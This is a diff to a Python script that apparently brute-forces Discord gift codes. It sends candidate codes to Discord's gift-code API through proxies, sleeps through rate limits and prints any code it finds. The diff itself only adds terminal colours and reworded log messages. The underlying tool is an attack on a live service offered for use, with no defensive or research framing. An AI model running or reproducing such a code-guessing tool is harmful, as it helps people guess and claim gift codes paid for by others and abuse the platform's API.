@@ -1,5 +1,15 @@
 import requests, string, json, time, random
 
+class bcolors:
+	HEADER = '\033[95m'
+	OKBLUE = '\033[94m'
+	OKGREEN = '\033[92m'
+	WARNING = '\033[93m'
+	FAIL = '\033[91m'
+	ENDC = '\033[0m'
+	BOLD = '\033[1m'
+	UNDERLINE = '\033[4m'
+
 proxies = {
 
 }
@@ -7,20 +17,20 @@ proxies = {
 def check_code(code, proxies):
 	while True:
 		r = requests.get('https://discord.com/api/v6/entitlements/gift-codes/' + code, proxies=proxies)
-		print(r.text)
+		#print(r.text)
 		result = json.loads(r.text)
 		if "message" in result:
 			if result["message"] == "You are being rate limited.":
-				print("======> [INFO] You are being rate limited for:" + str(result["retry_after"]))
+				print(bcolors.WARNING + "======> [WARN] You are being rate limited for: " + str(result["retry_after"]) + " ms" + bcolors.ENDC)
 				time.sleep(result["retry_after"] / 1000)
 			elif result["message"] == "Unknown Gift Code":
-				print("======> [INFO] Unknown gift code: " + str(code))
+				print(bcolors.FAIL + "======> [INFO] Unknown gift code: " + str(code) + bcolors.ENDC)
 				return
 			else:
-				print("======> [INFO] Found gift: " + str(code))
+				print(bcolors.OKBLUE + "======> [INFO] Found gift: " + str(code) + bcolors.ENDC)
 				return
 		else:
-			print("======> [ERROR] Failed to find 'message' for code: " + str(code))
+			print(bcolors.FAIL + "======> [ERR] Failed to find 'message' for code: " + str(code) + bcolors.ENDC)
 			return
 
 
